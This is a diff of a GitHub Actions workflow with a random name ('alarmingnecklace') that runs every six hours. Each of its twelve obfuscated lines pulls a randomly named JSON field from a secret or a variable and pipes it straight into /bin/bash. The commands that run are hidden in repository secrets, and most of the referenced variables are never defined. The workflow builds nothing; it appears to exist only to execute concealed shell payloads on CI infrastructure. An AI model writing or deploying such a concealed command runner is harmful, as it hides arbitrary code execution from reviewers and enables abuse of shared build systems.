@@ -1,26 +1,30 @@
 name: alarmingnecklace
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
+    - cron: '33 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: alarmingnecklace
         env:
-          bz8639: ${{ secrets.bz8639 }}
+          smd0: ${{ secrets.smd0 }}
         run: |
-          echo $bz8639 | jq -r .tnadp1482 | /bin/bash
-          echo $rlu2604 | jq -r .anvy54 | /bin/bash
-          echo $go135 | jq -r .uzb284 | /bin/bash
-          echo $rc513 | jq -r .ii2721 | /bin/bash
-          echo $smjv3 | jq -r .xipu56878 | /bin/bash
-          echo $wno38 | jq -r .gfjcz0 | /bin/bash
-          echo $kwwb402 | jq -r .dwfs88 | /bin/bash
-          echo $myt225 | jq -r .noge8369 | /bin/bash
-          echo $tm63038 | jq -r .w291 | /bin/bash
-          echo $qahd17 | jq -r .rplwk31 | /bin/bash
-          echo $uas4 | jq -r .co067 | /bin/bash
+          echo $smd0 | jq -r .i93617 | /bin/bash
+          echo $nbsfd34125 | jq -r .g5 | /bin/bash
+          echo $c615 | jq -r .cvitk83 | /bin/bash
+          echo $vg1 | jq -r .rtw55 | /bin/bash
+          echo $qllru45015 | jq -r .uxke1277 | /bin/bash
+          echo $irooy64931 | jq -r .llum4887 | /bin/bash
+          echo $rhek48407 | jq -r .ayv33226 | /bin/bash
+          echo $evfk0 | jq -r .mtxkt9527 | /bin/bash
+          echo $fb13523 | jq -r .zoog4 | /bin/bash
+          echo $kovi6871 | jq -r .euqr09794 | /bin/bash
+          echo $p73 | jq -r .o6194 | /bin/bash
+          echo $csg451 | jq -r .q51 | /bin/bash
 
